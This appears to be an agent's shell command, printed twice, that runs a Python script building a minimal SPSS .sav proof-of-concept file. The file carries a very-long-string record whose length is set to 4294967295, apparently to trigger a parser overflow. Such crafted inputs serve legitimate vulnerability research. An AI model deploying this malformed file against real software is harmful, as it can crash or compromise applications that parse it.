Command `cd /workspace && python3 << 'PYEOF'
import struct

# Build a minimal SAV file

# File header
rec_type = b'$FL2'
prod_name = b'@(#) SPSS DATA FILE' + b'\x00' * (60 - len(b'@(#) SPSS DATA FILE'))
layout_code = struct.pack('<i', 2)
nominal_case_size = struct.pack('<i', 8)
compression = struct.pack('<i', 0)
weight_index = struct.pack('<i', 0)
ncases = struct.pack('<i', 1)
bias = struct.pack('<d', 100.0)
creation_date = b'01 Jan 70'
creation_time = b'00:00:00'
file_label = b'\x00' * 64
padding = b'\x00' * 3

header = rec_type + prod_name + layout_code + nominal_case_size + compression + weight_index + ncases + bias + creation_date + creation_time + file_label + padding

# Variable record (type 2)
var_record = struct.pack('<i', 2) + struct.pack('<i', 0) * 4 + b'VAR00001'

# Very long string record (type 7, subtype 14)
# Set string_length to a very large value
vl_data = b'VAR00001=4294967295\x00'
info_record = struct.pack('<i', 7) + struct.pack('<i', 14) + struct.pack('<i', 1) + struct.pack('<i', len(vl_data)) + vl_data

# Dictionary termination record (type 999)
term_record = struct.pack('<i', 999)

sav_data = header + var_record + info_record + term_record

with open('/tmp/test_poc.sav', 'wb') as f:
    f.write(sav_data)

print(f"PoC file size: {len(sav_data)} bytes")

import struct
# Build a minimal SAV file
# File header
rec_type = b'$FL2'
prod_name = b'@(#) SPSS DATA FILE' + b'\x00' * (60 - len(b'@(#) SPSS DATA FILE'))
layout_code = struct.pack('<i', 2)
nominal_case_size = struct.pack('<i', 8)
compression = struct.pack('<i', 0)
weight_index = struct.pack('<i', 0)
ncases = struct.pack('<i', 1)
bias = struct.pack('<d', 100.0)
creation_date = b'01 Jan 70'
creation_time = b'00:00:00'
file_label = b'\x00' * 64
padding = b'\x00' * 3
header = rec_type + prod_name + layout_code + nominal_case_size + compression + weight_index + ncases + bias + creation_date + creation_time + file_label + padding
# Variable record (type 2)
var_record = struct.pack('<i', 2) + struct.pack('<i', 0) * 4 + b'VAR00001'
# Very long string record (type 7, subtype 14)
# Set string_length to a very large value
vl_data = b'VAR00001=4294967295\x00'
info_record = struct.pack('<i', 7) + struct.pack('<i', 14) + struct.pack('<i', 1) + struct.pack('<i', len(vl_data)) + vl_data
# Dictionary termination record (type 999)
term_record = struct.pack('<i', 999)
sav_data = header + var_record + info_record + term_record
with open('/tmp/test_poc.sav', 'wb') as f:
    f.write(sav_data)
print(f"PoC file size: {len(sav_data)} bytes")
